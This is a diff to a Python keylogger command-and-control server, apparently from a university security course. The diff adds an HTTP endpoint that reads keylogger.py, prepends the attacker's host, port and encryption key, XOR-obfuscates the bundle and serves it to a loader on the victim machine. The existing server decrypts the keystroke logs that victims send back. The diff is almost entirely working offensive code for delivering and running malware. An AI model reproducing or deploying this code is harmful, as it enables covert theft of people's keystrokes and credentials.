@@ -15,12 +15,22 @@ Flujo:
 import os
 import socket
 import struct
+import threading
+import types
 from datetime import datetime
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 import config
 
+PAYLOAD_PORT = 8080
+XOR_KEY = b"SecurityUTalca2026"
+
 RECEIVED_LOG = "received_logs.txt"
+
+
+def _xor(data: bytes, key: bytes) -> bytes:
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
 # ---------------------------------------------------------------------------
 # DESCIFRADO — AES-256-GCM
@@ -42,6 +52,50 @@ def _decrypt(data: bytes, key: bytes) -> str:
     """
     nonce, ciphertext_tag = data[:12], data[12:]
     return AESGCM(key).decrypt(nonce, ciphertext_tag, None).decode("utf-8")
+
+
+# ---------------------------------------------------------------------------
+# SERVIDOR HTTP — sirve el payload al loader en la víctima
+# ---------------------------------------------------------------------------
+
+class _PayloadHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/payload":
+            with open("keylogger.py", "r", encoding="utf-8") as f:
+                keylogger_code = f.read()
+
+            config_block = (
+                "import sys, types as _t\n"
+                "_m = _t.ModuleType('config')\n"
+                f"_m.LOG_FILE = r'{config.LOG_FILE}'\n"
+                f"_m.APP_NAME = '{config.APP_NAME}'\n"
+                f"_m.SERVER_HOST = '{config.SERVER_HOST}'\n"
+                f"_m.SERVER_PORT = {config.SERVER_PORT}\n"
+                f"_m.SEND_INTERVAL = {config.SEND_INTERVAL}\n"
+                f"_m.ENCRYPTION_KEY = '{config.ENCRYPTION_KEY}'\n"
+                "sys.modules['config'] = _m\n"
+                "del _m\n"
+            )
+            plaintext = (config_block + keylogger_code).encode("utf-8")
+            payload = _xor(plaintext, XOR_KEY)
+
+            self.send_response(200)
+            self.send_header("Content-Type", "application/octet-stream")
+            self.send_header("Content-Length", str(len(payload)))
+            self.end_headers()
+            self.wfile.write(payload)
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def log_message(self, format, *args):
+        pass
+
+
+def _start_payload_server():
+    httpd = HTTPServer(("0.0.0.0", PAYLOAD_PORT), _PayloadHandler)
+    print(f"[*] Payload HTTP en 0.0.0.0:{PAYLOAD_PORT}/payload")
+    httpd.serve_forever()
 
 
 # ---------------------------------------------------------------------------
@@ -92,6 +146,9 @@ def _handle(conn: socket.socket, addr: tuple, key: bytes) -> None:
 
 def main() -> None:
     key = bytes.fromhex(config.ENCRYPTION_KEY)
+
+    t = threading.Thread(target=_start_payload_server, daemon=True)
+    t.start()
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
         srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
